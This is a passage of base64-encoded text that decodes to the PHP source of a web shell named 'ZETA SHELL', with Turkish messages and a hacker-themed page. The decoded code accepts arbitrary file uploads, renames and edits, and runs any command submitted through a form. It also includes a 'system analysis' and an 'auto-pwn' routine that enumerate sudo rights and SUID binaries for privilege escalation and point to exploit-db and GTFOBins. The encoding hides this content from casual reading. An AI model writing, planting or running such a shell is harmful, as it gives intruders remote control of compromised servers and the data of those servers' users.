1QgxLDFn2xlbWxlcmkKaWYgKCRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddID09PSAnUE9TVCcpIHsKICAgIGlmIChpc3NldCgkX1BPU1RbInVwbG9hZCJdKSkgeyAvKiAuLi4gVXBsb2FkIGxvZ2ljIC4uLiAqLyBpZihpc3NldCgkX0ZJTEVTWyJmaWxlVG9VcGxvYWQiXSkgJiYgJF9GSUxFU1siZmlsZVRvVXBsb2FkIl1bImVycm9yIl0gPT0gVVBMT0FEX0VSUl9PSykgeyAkdGFyZ2V0X2ZpbGUgPSBQQVRIIC4gIi8iIC4gYmFzZW5hbWUoJF9GSUxFU1siZmlsZVRvVXBsb2FkIl1bIm5hbWUiXSk7IGlmICghQGlzX3dyaXRhYmxlKFBBVEgpKSB7ICRfU0VTU0lPTlsnbWVzc2FnZSddPSdIYXRhOiBEaXppbiAoJy5odG1sc3BlY2lhbGNoYXJzKFBBVEgpLicpIHlhesSxbGFtxLF5b3IhJzsgJF9TRVNTSU9OWydtZXNzYWdlX3R5cGUnXT0nZXJyb3InOyB9IGVsc2VpZiAoQG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWyJmaWxlVG9VcGxvYWQiXVsidG1wX25hbWUiXSwgJHRhcmdldF9maWxlKSkgeyAkX1NFU1NJT05bJ21lc3NhZ2UnXSA9IGh0bWxzcGVjaWFsY2hhcnMoYmFzZW5hbWUoJF9GSUxFU1siZmlsZVRvVXBsb2FkIl1bIm5hbWUiXSkpLicgecO8a2xlbmRpISc7ICRfU0VTU0lPTlsnbWVzc2FnZV90eXBlJ109J3N1Y2Nlc3MnOyB9IGVsc2UgeyAkdXBsb2FkX2Vycm9yID0gJF9GSUxFU1siZmlsZVRvVXBsb2FkIl1bImVycm9yIl07ICRfU0VTU0lPTlsnbWVzc2FnZSddPSdIYXRhOiBZw7xrbGVuZW1lZGkhIChFcnJvcjogJy4kdXBsb2FkX2Vycm9yLicpJzsgJF9TRVNTSU9OWydtZXNzYWdlX3R5cGUnXT0nZXJyb3InOyB9IH0gZWxzZSB7ICR1cGxvYWRfZXJyb3IgPSBpc3NldCgkX0ZJTEVTWyJmaWxlVG9VcGxvYWQiXVsiZXJyb3IiXSkgPyAkX0ZJTEVTWyJmaWxlVG9VcGxvYWQiXVsiZXJyb3IiXSA6ICdVbmtub3duJzsgJHBocF91cGxvYWRfZXJyb3JzID0gYXJyYXkoIFVQTE9BRF9FUlJfSU5JX1NJWkU9PidwaHAuaW5pIHNpemUgbGltaXQnLCBVUExPQURfRVJSX0ZPUk1fU0laRT0+J0Zvcm0gc2l6ZSBsaW1pdCcsIFVQTE9BRF9FUlJfUEFSVElBTD0+J1BhcnRpYWwgdXBsb2FkJywgVVBMT0FEX0VSUl9OT19GSUxFPT4nTm8gZmlsZScsIFVQTE9BRF9FUlJfTk9fVE1QX0RJUj0+J05vIHRtcCBkaXInLCBVUExPQURfRVJSX0NBTlRfV1JJVEU9PidDYW5ub3Qgd3JpdGUnLCBVUExPQURfRVJSX0VYVEVOU0lPTj0+J1BIUCBFeHRlbnNpb24gc3RvcCcpOyAkZXJyb3JfbWVzc2FnZSA9IGlzc2V0KCRwaHBfdXBsb2FkX2Vycm9yc1skdXBsb2FkX2Vycm9yXSkgPyAkcGhwX3VwbG9hZF9lcnJvcnNbJHVwbG9hZF9lcnJvcl0gOiAnVW5rbm93biB1cGxvYWQgZXJyb3IuJzsgJF9TRVNTSU9OWydtZXNzYWdlJ10gPSAnSGF0YTogJyAuICRlcnJvcl9tZXNzYWdlIC4gJyAoQ29kZTogJyAuICR1cGxvYWRfZXJyb3IgLiAnKSc7ICRfU0VTU0lPTlsnbWVzc2FnZV90eXBlJ109J2Vycm9yJzsgfSBoZWFkZXIoJ0xvY2F0aW9uOiA/cD0nIC4gdXJsZW5jb2RlKGVuY29kZVBhdGgoUEFUSCkpKTsgZXhpdDsgfQogICAgZWxzZWlmIChpc3NldCgkX1BPU1RbJ3JlbmFtZSddKSkgeyAvKiAuLi4gUmVuYW1lIGxvZ2ljIC4uLiAqLyAkb3JpZ2luYWxfcGF0aCA9IFBBVEggLiAiLyIgLiAkX1BPU1RbJ29yaWdpbmFsX25hbWUnXTsgJG5ld19wYXRoID0gUEFUSCAuICIvIiAuICRfUE9TVFsnbmV3X25hbWUnXTsgaWYgKCFmaWxlX2V4aXN0cygkb3JpZ2luYWxfcGF0aCkpIHsgJG1zZz0nSGF0YTogT3JpamluYWwgYnVsdW5hbWFkxLEhJzsgJHR5cGU9J2Vycm9yJzsgfSBlbHNlaWYgKCRvcmlnaW5hbF9wYXRoID09PSAkbmV3X3BhdGgpIHsgJG1zZz0nxLBzaW1sZXIgYXluxLEhJzsgJHR5cGU9J2luZm8nOyB9IGVsc2VpZiAoQHJlbmFtZSgkb3JpZ2luYWxfcGF0aCwgJG5ld19wYXRoKSkgeyAkbXNnPSdZZW5pZGVuIGFkbGFuZMSxcsSxbGTEsSEnOyAkdHlwZT0nc3VjY2Vzcyc7IH0gZWxzZSB7ICRtc2c9J0hhdGE6IEFkbGFuZMSxcsSxbGFtYWTEsSEgxLB6aW4/JzsgJHR5cGU9J2Vycm9yJzsgfSAkX1NFU1NJT05bJ21lc3NhZ2UnXSA9ICRtc2c7ICRfU0VTU0lPTlsnbWVzc2FnZV90eXBlJ10gPSAkdHlwZTsgaGVhZGVyKCdMb2NhdGlvbjogP3A9JyAuIHVybGVuY29kZShlbmNvZGVQYXRoKFBBVEgpKSk7IGV4aXQ7IH0KICAgIGVsc2VpZihpc3NldCgkX1BPU1RbJ2VkaXQnXSkpIHsgLyogLi4uIEVkaXQgbG9naWMgLi4uICovICRmaWxlbmFtZSA9IFBBVEguIi8iLiRfUE9TVFsnZmlsZV90b19zYXZlJ107IGlmICghaXNfd3JpdGFibGUoJGZpbGVuYW1lKSkgeyAkbXNnPSdIYXRhOiBIYWxhIHlhesSxbGFtxLF5b3IhJzsgJHR5cGU9J2Vycm9yJzsgfSBlbHNlIHsgJGRhdGEgPSAkX1BPU1RbJ2RhdGEnXTsgaWYoQGZpbGVfcHV0X2NvbnRlbnRzKCRmaWxlbmFtZSwgJGRhdGEpICE9PSBmYWxzZSkgeyAkbXNnPSdLYXlkZWRpbGRpISc7ICR0eXBlPSdzdWNjZXNzJzsgfSBlbHNlIHsgJG1zZz0nSGF0YTogS2F5ZGVkaWxlbWVkaSEnOyAkdHlwZT0nZXJyb3InOyB9IH0gJF9TRVNTSU9OWydtZXNzYWdlJ10gPSAkbXNnOyAkX1NFU1NJT05bJ21lc3NhZ2VfdHlwZSddID0gJHR5cGU7IGhlYWRlcignTG9jYXRpb246ID9wPScgLiB1cmxlbmNvZGUoZW5jb2RlUGF0aChQQVRIKSkpOyBleGl0OyB9CiAgICBlbHNlaWYoaXNzZXQoJF9QT1NUWydydW5fY29tbWFuZCddKSkgeyAkY21kID0gJF9QT1NUWydjb21tYW5kJ107ICRjbWRfcmVzdWx0ID0gcnVuQ29tbWFuZCgkY21kKTsgJGFjdGlvbl9yZXN1bHRfb3V0cHV0ID0gJGNtZF9yZXN1bHRbJ291dHB1dCddOyB9CiAgICBlbHNlaWYoaXNzZXQoJF9QT1NUWydhbmFseXplX3N5c3RlbSddKSkgeyAvKiAuLi4gU3lzdGVtIEFuYWx5emUgbG9naWMgLi4uICovICRhbmFseXNpc19vdXRwdXQgPSAiLS0tIE9TL0tlcm5lbCBJbmZvIC0tLVxuIjsgJGFuYWx5c2lzX291dHB1dCAuPSBydW5Db21tYW5kKCd1bmFtZSAtYScpWydvdXRwdXQnXSAuICJcbiI7ICRvc19yZWxlYXNlID0gQGZpbGVfZ2V0X2NvbnRlbnRzKCcvZXRjL29zLXJlbGVhc2UnKTsgJGFuYWx5c2lzX291dHB1dCAuPSAoJG9zX3JlbGVhc2UgPzogcnVuQ29tbWFuZCgnY2F0IC9ldGMvaXNzdWUnKVsnb3V0cHV0J10pIC4gIlxuIjsgJGFuYWx5c2lzX291dHB1dCAuPSAiLS0tIFN1ZG8gVmVyc2lvbiAtLS1cbiI7ICRhbmFseXNpc19vdXRwdXQgLj0gcnVuQ29tbWFuZCgnc3VkbyAtViAyPiYxJylbJ291dHB1dCddIC4gIlxuIjsgJGFuYWx5c2lzX291dHB1dCAuPSAiLS0tIFNVSUQgQmluYXJpZXMgLS0tXG4iOyAkYW5hbHlzaXNfb3V0cHV0IC49IHJ1bkNvbW1hbmQoJ2ZpbmQgLyAtcGVybSAtNDAwMCAtdHlwZSBmIC1scyAyPi9kZXYvbnVsbCcpWydvdXRwdXQnXSAuICJcbiI7ICRhbmFseXNpc19vdXRwdXQgLj0gIlxuLS0tIFNVR0dFU1RJT05TIC0tLVxuIjsgJGFuYWx5c2lzX291dHB1dCAuPSAiKiBDaGVjayBrZXJuZWwgb24gZXhwbG9pdC1kYiAvIHNlYXJjaHNwbG9pdC5cbiI7ICRhbmFseXNpc19vdXRwdXQgLj0gIiogQ2hlY2sgc3VkbyB2ZXJzaW9uIGZvciB2dWxucyAoZS5nLiwgQmFyb24gU2FtZWRpdCkuXG4iOyAkYW5hbHlzaXNfb3V0cHV0IC49ICIqIEFuYWx5emUgU1VJRCBiaW5zIHVzaW5nIEdURk9CaW5zLlxuIjsgJGFuYWx5c2lzX291dHB1dCAuPSAiKiBSdW4gJ3N1ZG8gLWwnLlxuIjsgJGFjdGlvbl9yZXN1bHRfb3V0cHV0ID0gJGFuYWx5c2lzX291dHB1dDsgfQogICAgZWxzZWlmKGlzc2V0KCRfUE9TVFsnYXR0ZW1wdF9hdXRvcHduJ10pKSB7IC8qIC4uLiBBdXRvIFB3biBMb2dpYyAuLi4gKi8gJHB3bl9vdXRwdXQgPSAiLS0tIEF0dGVtcHRpbmcgQXV0by1Qd24gLS0tIFxuIjsgJHB3bl9vdXRwdXQgLj0gIlsrXSBDaGVja2luZyAnc3VkbyAtbCcuLi5cbiI7ICRzdWRvX2wgPSBydW5Db21tYW5kKCdzdWRvIC1sIDI+JjEnKVsnb3V0cHV0J107ICRwd25fb3V0cHV0IC49ICRzdWRvX2wgLiAiXG4iOyBpZiAoc3RyaXBvcygkc3Vkb19sLCAnTk9QQVNTV0Q6JykgIT09IGZhbHNlICYmIHN0cmlwb3MoJHN1ZG9fbCwgJ21heSBydW4gdGhlIGZvbGxvd2luZyBjb21tYW5kcycpICE9PSBmYWxzZSkgeyAkcHduX291dHB1dCAuPSAiWyFdIFBvdGVudGlhbCBOT1BBU1NXRCBzdWRvIGZvdW5kISBDaGVjayBhbGxvd2VkIGNvbW1hbmRzIVxuIjsgfSBlbHNlIHsgJHB3bl9vdXRwdXQgLj0gIlstXSBObyBvYnZpb3VzIE5PUEFTU1dEIHN1ZG8gZm91bmQuXG4iOyB9ICRwd25fb3V0cHV0IC49ICJbK10gQ2hlY2tpbmcgY29tbW9uIFNVSUQgZXhwbG9pdHMgKGJhc2ljKS4uLlxuIjsgJHN1aWRfYmlucyA9IGFycmF5KCdubWFwJywnZmluZCcsJ3ZpbScsJ2NwJywnbXYnLCdiYXNoJywnbW9yZScsJ2xlc3MnLCduYW5vJywnYXdrJyk7IGZvcmVhY2goJHN1aWRfYmlucyBhcyAkYmluKSB7ICRmaW5kX2NtZCA9ICJmaW5kIC8gLW5hbWUgIi4kYmluLiIgLXBlcm0gLTQwMDAgLXR5cGUgZiAtcHJpbnQgMj4vZGV2L251bGwiOyAkZm91bmQgPSBydW5Db21tYW5kKCRmaW5kX2NtZClbJ291dHB1dCddOyBpZiAoIWVtcHR5KCRmb3VuZCkpIHsgJHB3bl9vdXRwdXQgLj0gIlshXSBGb3VuZCBTVUlEIGJpbmFyeTogIi4kZm91bmQuIiAoQ2hlY2sgR1RGT0JpbnMgZm9yICciLiRiaW4uIicpXG4iOyB9IH0gJHB3bl9vdXRwdXQgLj0gIlstXSBCYXNpYyBTVUlEIGNoZWNrcyBmaW5pc2hlZC5cbiI7ICRwd25fb3V0cHV0IC49ICJcbi0tLSBBdXRvLVB3biBBdHRlbXB0IEZpbmlzaGVkIC0tLSBcbiI7ICRhY3Rpb25fcmVzdWx0X291dHB1dCA9ICRwd25fb3V0cHV0OyB9Cn0gLy8gUE9TVCBzb251Cgo/Pgo8IURPQ1RZUEUgaHRtbD4KPGh0bWwgbGFuZz0idHIiPgo8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICAgIDxtZXRhIGh0dHAtZXF1aXY9IlgtVUEtQ29tcGF0aWJsZSIgY29udGVudD0iSUU9ZWRnZSI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+WkVUQSBTSEVMTCBWxLBQPD9waHAgZWNobyAkU0hFTExfVkVSU0lPTjsgPz4gW0RFQlVHXTwvdGl0bGU+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vY2RuanMuY2xvdWRmbGFyZS5jb20vYWpheC9saWJzL2ZvbnQtYXdlc29tZS82LjQuMC9jc3MvYWxsLm1pbi5jc3MiIGludGVncml0eT0ic2hhNTEyLWllY2RMbWFza2w3Q1ZrcWtYTlEvWkgvWExsdldaT0p5ajdZeTd0Y2VubXBEMXlwQVNvenBtVC9FMGlQdG1GSUI0NlptZHRBYzllTkJ2SDBIL1pwaUJ3PT0iIGNyb3Nzb3JpZ2luPSJhbm9ueW1vdXMiIHJlZmVycmVycG9saWN5PSJuby1yZWZlcnJlciIgLz4KICAgIDxzY3JpcHQgc3JjPSJodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvbnBtL3R5cGVkLmpzQDIuMC4xMiI+PC9zY3JpcHQ+CiAgICA8c3R5bGU+CiAgICAgICAgLyogLS0tIEtBT1MgQ1NTIC0tLSAqLwogICAgICAgIC8qIC4uLiAoQ1NTIFN0aWxsZXJpIMO2bmNla2kga29kZGFuIGF5bmVuIGFsxLFuYWNhaykgLi4uICovCiAgICAgICAgIEBpbXBvcnQgdXJsKCdodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2NzczI/ZmFtaWx5PUZpcmErQ29kZTp3Z2h0QDQwMDs3MDAmZGlzcGxheT1zd2FwJyk7CiAgICAgICAgOnJvb3QgeyAtLWJnLWNvbG9yOiAjMGEwYTBhOyAtLXRlcm1pbmFsLWJnOiAjMWExYTFhOyAtLXRleHQtY29sb3I6ICMwMGZmMDA7IC0taGVhZGVyLWNvbG9yOiAjZmYwMDNjOyAtLWxpbmstY29sb3I6ICMwMGZmZmY7IC0tbGluay1ob3ZlcjogI2ZmZmZmZjsgLS1ib3JkZXItY29sb3I6ICMzMzM7IC0taWNvbi1jb2xvcjogI2ZmMDAzYzsgLS1idXR0b24tYmc6ICNmZjAwM2M7IC0tYnV0dG9uLXRleHQ6ICMwMDA7IC0tYnV0dG9uLWhvdmVyLWJnOiAjZmY0ZDZkOyAtLXRhYmxlLWhlYWRlci1iZzogIzJhMmEyYTsgLS1jb2RlLWJnOiAjMDUwNTA1OyAtLWhhY2tlci1mb250OiAnRmlyYSBDb2RlJywgbW9ub3NwYWNlOyAtLXBlcm1zLWNvbG9yOiAjYWFhYWFhOyB9CiAgICAgICAgYm9keSB7IGJhY2tncm91bmQtY29sb3I6IHZhcigtLWJnLWNvbG9yKTsgY29sb3I6IHZhcigtLXRleHQtY29sb3IpOyBmb250LWZhbWlseTogdmFyKC0taGFja2VyLWZvbnQpOyBtYXJnaW46IDA7IHBhZGRpbmc6IDA7IGZvbnQtc2l6ZTogMTRweDsgbGluZS1oZWlnaHQ6IDEuNjsgb3ZlcmZsb3cteDogaGlkZGVuOyB9CiAgICAgICAgLmNvbnRhaW5lci1mbHVpZCB7IHBhZGRpbmc6IDE1cHg7IG1heC13aWR0aDogMTYwMHB4OyBtYXJnaW46IDAgYXV0bzsgfQogICAgICAgIC5oYWNrZXItbmF2IHsgYmFja2dyb3VuZC1jb2xvcjogdmFyKC0tdGVybWluYWwtYmcpOyBib3JkZXItYm90dG9tOiAycHggc29saWQgdmFyKC0taGVhZGVyLWNvbG9yKTsgcGFkZGluZzogOHB4IDE1cHg7IG1hcmdpbi1ib3R0b206IDE1cHg7IGRpc3BsYXk6IGZsZXg7IGp1c3RpZnktY29udGVudDogc3BhY2UtYmV0d2VlbjsgYWxpZ24taXRlbXM6IGNlbnRlcjsgZmxleC13cmFwOiB3cmFwOyB9CiAgICAgICAgLm5hdmJhci1icmFuZCB7IGNvbG9yOiB2YXIoLS1oZWFkZXItY29sb3IpOyBmb250LXdlaWdodDogYm9sZDsgZm9udC1zaXplOiAxLjNlbTsgdGV4dC1zaGFkb3c6IDAgMCA1cHggdmFyKC0taGVhZGVyLWNvbG9yKTsgfSAubmF2YmFyLWJyYW5kIGkgeyBtYXJnaW4tcmlnaHQ6IDhweDsgfQogICAgICAgIC5uYXZiYXItYnJhbmQgYSwgLmJyZWFkY3J1bWIgYSB7IGNvbG9yOiB2YXIoLS1saW5rLWNvbG9yKTsgdGV4dC1kZWNvcmF0aW9uOiBub25lOyBtYXJnaW46IDAgMnB4OyB9IC5uYXZiYXItYnJhbmQgYTpob3ZlciwgLmJyZWFkY3J1bWIgYTpob3ZlciB7IGNvbG9yOiB2YXIoLS1saW5rLWhvdmVyKTsgdGV4dC1kZWNvcmF0aW9uOiB1bmRlcmxpbmU7IH0KICAgICAgICAuYnJlYWRjcnVtYiB7IGJhY2tncm91bmQ6IHZhcigtLXRlcm1pbmFsLWJnKTsgcGFkZGluZzogOHB4IDEycHg7IG1hcmdpbi1ib3R0b206MTVweDsgYm9yZGVyOiAxcHggc29saWQgdmFyKC0tYm9yZGVyLWNvbG9yKTsgYm9yZGVyLXJhZGl1czogM3B4OyB3b3JkLWJyZWFrOiBicmVhay1hbGw7IGNvbG9yOiB2YXIoLS10ZXh0LWNvbG9yKTsgZm9udC1zaXplOiAwLjllbTsgfSAuYnJlYWRjcnVtYiBpIHsgbWFyZ2luLXJpZ2h0OiA1cHg7IGNvbG9yOiB2YXIoLS1oZWFkZXItY29sb3IpOyB9CiAgICAgICAgLmhhY2tlci1jb250cm9scyBhIGJ1dHRvbiwgLmhhY2tlci1jb250cm9scyBpbnB1dFt0eXBlPSJzdWJtaXQiXSwgLnF1aWNrLWNtZC1idG4sIC5hY3Rpb24tYnRuLCAuY29uZmlnLWJ0biB7IGJhY2tncm91bmQtY29sb3I6IHZhcigtLWJ1dHRvbi1iZyk7IGNvbG9yOiB2YXIoLS1idXR0b24tdGV4dCk7IGJvcmRlcjogbm9uZTsgcGFkZGluZzogNHB4IDhweDsgbWFyZ2luLWxlZnQ6IDhweDsgY3Vyc29yOiBwb2ludGVyOyBmb250LWZhbWlseTogdmFyKC0taGFja2VyLWZvbnQpOyBmb250LXdlaWdodDogYm9sZDsgdHJhbnNpdGlvbjogYmFja2dyb3VuZC1jb2xvciAwLjNzIGVhc2U7IGJvcmRlci1yYWRpdXM6IDNweDsgZm9udC1zaXplOiAwLjg1ZW07IG1hcmdpbi1ib3R0b206IDVweDsgfQogICAgICAgIC5oYWNrZXItY29udHJvbHMgYSBidXR0b246aG92ZXIsIC5oYWNrZXItY29udHJvbHMgaW5wdXRbdHlwZT0ic3VibWl0Il06aG92ZXIsIC5xdWljay1jbWQtYnRuOmhvdmVyLCAuYWN0aW9uLWJ0bjpob3ZlciwgLmNvbmZpZy1idG46aG92ZXIgeyBiYWNrZ3JvdW5kLWNvbG9yOiB2YXIoLS1idXR0b24taG92ZXItYmcpOyB9IC5oYWNrZXItY29udHJvbHMgaSB7IG1hcmdpbi1yaWdodDogNHB4O30KICAgICAgICAuaGFja2VyLXRhYmxlIHsgd2lkdGg6IDEwMCU7IGJvcmRlci1jb2xsYXBzZTogY29sbGFwc2U7IG1hcmdpbi10b3A6IDE1cHg7IGJhY2tncm91bmQtY29sb3I6IHZhcigtLXRlcm1pbmFsLWJnKTsgYm9yZGVyOiAxcHggc29saWQgdmFyKC0tYm9yZGVyLWNvbG9yKTsgYm94LXNoYWRvdzogMCAwIDEwcHggcmdiYSgyNTUsIDAsIDYwLCAwLjIpOyB9CiAgICAgICAgLmhhY2tlci10YWJsZSB0aCwgLmhhY2tlci10YWJsZSB0ZCB7IGJvcmRlcjogMXB4IHNvbGlkIHZhcigtLWJvcmRlci1jb2xvcik7IHBhZGRpbmc6IDZweCAxMHB4OyB0ZXh0LWFsaWduOiBsZWZ0OyB2ZXJ0aWNhbC1hbGlnbjogbWlkZGxlOyB3b3JkLWJyZWFrOiBicmVhay1hbGw7IGZvbnQtc2l6ZTogMC45ZW07IH0KICAgICAgICAuaGFja2VyLXRhYmxlIHRoIHsgYmFja2dyb3VuZC1jb2xvcjogdmFyKC0tdGFibGUtaGVhZGVyLWJnKTsgY29sb3I6IHZhcigtLWhlYWRlci1jb2xvcik7IGZvbnQtd2VpZ2h0OiBib2xkOyB9CiAgICAgICAgLmhhY2tlci10YWJsZSB0cjpudGgtY2hpbGQoZXZlbikgeyBiYWNrZ3JvdW5kLWNvbG9yOiByZ2JhKDAsIDI1NSwgMCwgMC4wMyk7IH0gLmhhY2tlci10YWJsZSB0cjpob3ZlciB7IGJhY2tncm91bmQtY29sb3I6IHJnYmEoMCwgMjU1LCAyNTUsIDAuMDgpOyB9CiAgICAgICAgLmhhY2tlci10YWJsZSB0ZCBhIHsgY29sb3I6IHZhcigtLWxpbmstY29sb3IpOyB0ZXh0LWRlY29yYXRpb246IG5vbmU7IG1hcmdpbi1yaWdodDogNnB4OyBkaXNwbGF5OiBpbmxpbmUtYmxvY2s7IHBvc2l0aW9uOiByZWxhdGl2ZTsgfSAuaGFja2VyLXRhYmxlIHRkIGE6aG92ZXIgeyBjb2xvcjogdmFyKC0tbGluay1ob3Zlcik7IH0KICAgICAgICAuaGFja2VyLXRhYmxlIHRkIGEgLnRvb2x0aXB0ZXh0IHsgdmlzaWJpbGl0eTogaGlkZGVuOyB3aWR0aDogODBweDsgYmFja2dyb3VuZC1jb2xvcjogIzU1NTsgY29sb3I6ICNmZmY7IHRleHQtYWxpZ246IGNlbnRlcjsgYm9yZGVyLXJhZGl1czogNnB4OyBwYWRkaW5nOiA1cHggMDsgcG9zaXRpb246IGFic29sdXRlOyB6LWluZGV4OiAxOyBib3R0b206IDEyNSU7IGxlZnQ6IDUwJTsgbWFyZ2luLWxlZnQ6IC00MHB4OyBvcGFjaXR5OiAwOyB0cmFuc2l0aW9uOiBvcGFjaXR5IDAuM3M7IGZvbnQtc2l6ZTogMC44ZW07IH0gLmhhY2tlci10YWJsZSB0ZCBhOmhvdmVyIC50b29sdGlwdGV4dCB7IHZpc2liaWxpdHk6IHZpc2libGU7IG9wYWNpdHk6IDE7IH0KICAgICAgICAuaGFja2VyLWljb24tZm9sZGVyIHsgY29sb3I6ICNmZmZmMDA7IH0gLmhhY2tlci1pY29uLWVycm9yIHsgY29sb3I6ICNmZjRkNGQ7IH0gLmhhY2tlci1pY29uLWNvbmZpZyB7IGNvbG9yOiAjY2NjY2NjOyB9IC5oYWNrZXItaWNvbi1jb2RlIHsgY29sb3I6ICM2NmNjZmY7IH0gLmhhY2tlci1pY29uLWltYWdlIHsgY29sb3I6ICNjYzk5ZmY7IH0gLmhhY2tlci1pY29uLWF1ZGlvIHsgY29sb3I6ICNmZjk5Y2M7IH0gLmhhY2tlci1pY29uLXZpZGVvIHsgY29sb3I6ICNmZmNjNjY7IH0gLmhhY2tlci1pY29uLXRleHQgeyBjb2xvcjogI2ZmZmZmZjsgfSAuaGFja2VyLWljb24tYXJjaGl2ZSB7IGNvbG9yOiAjOTlmZjk5OyB9IC5oYWNrZXItaWNvbi1kb2MgeyBjb2xvcjogI2ZmYWQzMzsgfSAuaGFja2VyLWljb24tZGVmYXVsdCB7IGNvbG9yOiB2YXIoLS10ZXh0LWNvbG9yKTsgfSAuaGFja2VyLWljb24tbG9jayB7IGNvbG9yOiAjZjBhZDRlOyB9IC5oYWNrZXItaWNvbi1hbmNob3IgeyBjb2xvcjogI2Q5NTM0ZjsgfQogICAgICAgIC5wZXJtcyB7IGNvbG9yOiB2YXIoLS1wZXJtcy1jb2xvcik7IGZvbnQtc2l6ZTogMC45ZW07IGN1cnNvcjogaGVscDsgfQogICAgICAgIGZvcm0geyBtYXJnaW4tYm90dG9tOiAxNXB4OyB9CiAgICAgICAgLmZvcm0tc2VjdGlvbiB7IGJhY2tncm91bmQtY29sb3I6IHZhcigtLXRlcm1pbmFsLWJnKTsgcGFkZGluZzogMTVweDsgbWFyZ2luLXRvcDogMTVweDsgYm9yZGVyOiAxcHggc29saWQgdmFyKC0tYm9yZGVyLWNvbG9yKTsgYm9yZGVyLXJhZGl1czogNXB4OyB9IC5mb3JtLXNlY3Rpb24gaDMgeyBmb250LXNpemU6IDEuMWVtOyBtYXJnaW4tYm90dG9tOiAxMHB4OyBjb2xvcjogdmFyKC0taGVhZGVyLWNvbG9yKTt9CiAgICAgICAgaW5wdXRbdHlwZT0iZmlsZSJdLCBpbnB1dFt0eXBlPSJ0ZXh0Il0sIHRleHRhcmVhLCBzZWxlY3QgeyBiYWNrZ3JvdW5kLWNvbG9yOiB2YXIoLS1jb2RlLWJnKTsgY29sb3I6IHZhcigtLXRleHQtY29sb3IpOyBib3JkZXI6IDFweCBzb2xpZCB2YXIoLS1ib3JkZXItY29sb3IpOyBwYWRkaW5nOiA2cHg7IG1hcmdpbjogNHB4IDA7IHdpZHRoOiBjYWxjKDEwMCUgLSAxOHB4KTsgZm9udC1mYW1pbHk6IHZhcigtLWhhY2tlci1mb250KTsgYm9yZGVyLXJhZGl1czogM3B4OyBmb250LXNpemU6IDAuOWVtOyB9CiAgICAgICAgdGV4dGFyZWEgeyBtaW4taGVpZ2h0OiAyNTBweDsgcmVzaXplOiB2ZXJ0aWNhbDsgfSBzZWxlY3QgeyB3aWR0aDogYXV0bzsgfQogICAgICAgIC5tZXNzYWdlIHsgcGFkZGluZzogOHB4IDEycHg7IG1hcmdpbjogMTJweCAwOyBib3JkZXItcmFkaXVzOiAzcHg7IGZvbnQtd2VpZ2h0OiBib2xkOyBib3JkZXI6IDFweCBzb2xpZCB0cmFuc3BhcmVudDsgZm9udC1zaXplOiAwLjllbTt9IC5tZXNzYWdlLnN1Y2Nlc3MgeyBiYWNrZ3JvdW5kLWNvbG9yOiByZ2JhKDAsIDI1NSwgMCwgMC4xKTsgYm9yZGVyLWNvbG9yOiB2YXIoLS10ZXh0LWNvbG9yKTsgY29sb3I6IHZhcigtLXRleHQtY29sb3IpOyB0ZXh0LXNoYWRvdzogMCAwIDNweCB2YXIoLS10ZXh0LWNvbG9yKTsgfSAubWVzc2FnZS5lcnJvciB7IGJhY2tncm91bmQtY29sb3I6IHJnYmEoMjU1LCAwLCA2MCwgMC4xKTsgYm9yZGVyLWNvbG9yOiB2YXIoLS1oZWFkZXItY29sb3IpOyBjb2xvcjogdmFyKC0taGVhZGVyLWNvbG9yKTsgdGV4dC1zaGFkb3c6IDAgMCAzcHggdmFyKC0taGVhZGVyLWNvbG9yKTsgfSAubWVzc2FnZSBpIHsgbWFyZ2luLXJpZ2h0OiA2cHg7IH0KICAgICAgICAuY29tbWFuZC1zZWN0aW9uLCAuY29sbGFwc2libGUtc2VjdGlvbiB7IGJhY2tncm91bmQtY29sb3I6IHZhcigtLXRlcm1pbmFsLWJnKTsgYm9yZGVyOiAxcHggc29saWQgdmFyKC0tYm9yZGVyLWNvbG9yKTsgcGFkZGluZzogMTVweDsgbWFyZ2luLXRvcDogMjBweDsgYm9yZGVyLXJhZGl1czogNXB4OyB9CiAgICAgICAgLmNvbGxhcHNpYmxlLXNlY3Rpb24gc3VtbWFyeSB7IGNvbG9yOiB2YXIoLS1oZWFkZXItY29sb3IpOyBmb250LXNpemU6IDEuMWVtOyBtYXJnaW4tYm90dG9tOiAxMHB4OyBjdXJzb3I6IHBvaW50ZXI7IGZvbnQtd2VpZ2h0OiBib2xkOyBsaXN0LXN0eWxlOiBub25lOyAvKiBPa3UgZ2l6bGUgKi8gfQogICAgICAgIC5jb2xsYXBzaWJsZS1zZWN0aW9uIHN1bW1hcnk6Oi13ZWJraXQtZGV0YWlscy1tYXJrZXIgeyBkaXNwbGF5OiBub25lOyAvKiBPa3UgZ2l6bGUgKHdlYmtpdCkgKi8gfQogICAgICAgIC5jb2xsYXBzaWJsZS1zZWN0aW9uIHN1bW1hcnk6OmJlZm9yZSB7IGNvbnRlbnQ6ICdcZjA3OCc7IC8qIEZvbnRBd2Vzb21lIGRvd24gYXJyb3cgKi8gZm9udC1mYW1pbHk6ICdGb250IEF3ZXNvbWUgNiBGcmVlJzsgZm9udC13ZWlnaHQ6IDkwMDsgbWFyZ2luLXJpZ2h0OiA4cHg7IGRpc3BsYXk6IGlubGluZS1ibG9jazsgdHJhbnNpdGlvbjogdHJhbnNmb3JtIDAuMnM7IH0KICAgICAgICAuY29sbGFwc2libGUtc2VjdGlvbltvcGVuXSBzdW1tYXJ5OjpiZWZvcmUgeyB0cmFuc2Zvcm06IHJvdGF0ZSgtMTgwZGVnKTsgfQogICAgICAgIC5jb2xsYXBzaWJsZS1zZWN0aW9uW29wZW5dIHN1bW1hcnkgeyBib3JkZXItYm90dG9tOiAxcHggc29saWQgdmFyKC0taGVhZGVyLWNvbG9yKTsgcGFkZGluZy1ib3R0b206IDVweDsgfQogICAgICAgIC5jb21tYW5kLXNlY3Rpb24gaDMsIC5jb2xsYXBzaWJsZS1zZWN0aW9uIGg0IHsgY29sb3I6IHZhcigtLWhlYWRlci1jb2xvcik7IGZvbnQtc2l6ZTogMS4xZW07IG1hcmdpbi1ib3R0b206IDEwcHg7IH0KICAgIC